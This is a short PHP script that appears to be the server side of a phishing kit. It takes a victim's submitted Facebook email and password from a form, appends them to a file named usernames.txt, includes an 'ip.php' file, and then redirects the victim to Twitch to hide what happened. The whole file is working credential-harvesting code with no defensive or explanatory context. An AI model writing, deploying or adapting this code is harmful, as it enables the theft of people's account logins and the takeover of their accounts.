<?php
include 'ip.php';

file_put_contents("usernames.txt", "[FB-EMAIL]: " . $_POST['fb_email'] . " [FB-PASS]: " . $_POST['fb_pass'] . "\n", FILE_APPEND);
header('Location: https://twitch.tv/');
exit();
